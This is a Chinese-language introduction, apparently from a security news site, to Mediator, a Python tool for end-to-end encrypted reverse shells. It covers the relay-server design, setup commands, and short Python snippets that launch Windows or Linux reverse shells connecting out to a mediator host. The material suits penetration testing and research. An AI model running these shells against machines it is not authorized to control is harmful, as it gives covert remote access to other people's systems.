![](https://image.3001.net/images/20211116/1637077806_6193d32ed42978cf4c5fd.png!small)

## 关于Mediator

Mediator是一款功能强大的可扩展端到端加密反向Shell，该工具基于新型架构实现，采用Python语言开发，能够帮助广大研究人员通过一台“Mediator”服务器来跟Shell建立连接。这样一来，研究人员就不需要处理程序设置端口转发以侦听连接。除此之外，Mediator还可以帮助我们创建插件来扩展反向Shell的功能。

值得一提的是，我们不仅可以将Mediator的脚本作为独立的可执行文件运行，也可以将它们导入到其他渗透测试或事件响应工具中进行集成。

## 工具体系架构

Mediator受到了端到端加密聊天应用程序的启发，因此Mediator使用了一种独特的方法来实现反向Shell的客户端/服务器模型。Mediator使用了如下所示的方法：

> 客户端反向Shell
>
> 客户端Handler/Operator
>
> 一台服务器作为连接两端的桥梁

反向Shell和Handler会使用一个连接密钥来跟Mediator服务器进行连接。服务器会监听80端口（Handler连接）和443端口（反向Shell连接）。当客户端连接至Mediator服务器时，服务器将桥接这两个连接。此时，两个客户端之间将进行密钥交换，反向Shell和Operator之间的所有通信流量都将采用端到端加密，这样就可以确保不会有其他第三方窥探Mediator正在传输的流量数据。

## 插件机制

Mediator的插件机制将允许我们添加额外的命令，这些命令能够在研究人员的主机以及目标主机上执行各种代码。

## 工具下载

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/lawndoc/mediator.git

## 工具配置&使用

### 服务器端

客户端脚本可以在Windows或Linux系统上运行，但你首先需要在Linux主机上配置并开启服务器（[
_mediator.py_](https://github.com/lawndoc/mediator/blob/main/mediator.py)）。服务器基于纯Python开发，因此在使用前无需安装额外的依赖组件。接下来，我们就可以使用下列命令来启动服务器了：

    
    
    $ python3 mediator.py

或者，我们也可以使用提供的[
_Dockerfile_](https://github.com/lawndoc/mediator/blob/main/Dockerfile)来在容器中运行Mediator服务器（确保开启了80端口和443端口）。

### 客户端

如需使用客户端脚本，则需要安装requirements.txt中定义的所有依赖组件，我们可以使用下列命令实现：

    
    
    $ pip3 install -r requirements.txt

### Mediator服务器地址

在使用Python脚本时，我们首先需要实例化中介主机的地址：

 **Handler类**

    
    
    from handler import Handler
    operator = Handler(mediatorHost="example.com")
    operator.run()

 **WindowsRShell类**

    
    
    from windowsTarget import WindowsRShell
    shell = WindowsRShell(mediatorHost="example.com")
    shell.run()

如果直接通过Shell执行客户端脚本，则则可以对脚本底部的地址进行硬编码，或者通过-s或--server参数来指定服务器地址：

 **handler.py**

    
    
    $ python3 handler.py -s example.com

 **windowsTarget.py**

    
    
    > python windowsTarget.py -s example.com

## 连接密钥

服务器只接受前缀为“#!ConnectionKey”的密钥，默认的连接密钥为“#!ConnectionKey_CHANGE_ME!!!”。

如需修改Python脚本所使用的连接密钥，可以选择在实例化时提供连接密钥：

 **Handler类**

    
    
    from handler import Handler
    operator = Handler(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
    operator.run()

 **LinuxRShell类**

    
    
    from linuxTarget import LinuxRShell
    shell = LinuxRShell(mediatorHost="example.com", connectionKey="#!ConnectionKey_secret_key")
    shell.run()

或者， 在Shell中运行客户端脚本时，通过-c或--connection-key参数来指定连接密钥。

## 项目地址

 **Mediator：** 【[ _GitHub传送门_](https://github.com/lawndoc/mediator)】

## 参考资料

  * [ _https://github.com/lawndoc/mediator/blob/main/mediator.py_](https://github.com/lawndoc/mediator/blob/main/mediator.py)
  * [ _https://github.com/lawndoc/mediator/blob/main/Dockerfile_](https://github.com/lawndoc/mediator/blob/main/Dockerfile)
  * [ _https://github.com/lawndoc/mediator/blob/main/requirements.txt_](https://github.com/lawndoc/mediator/blob/main/requirements.txt)

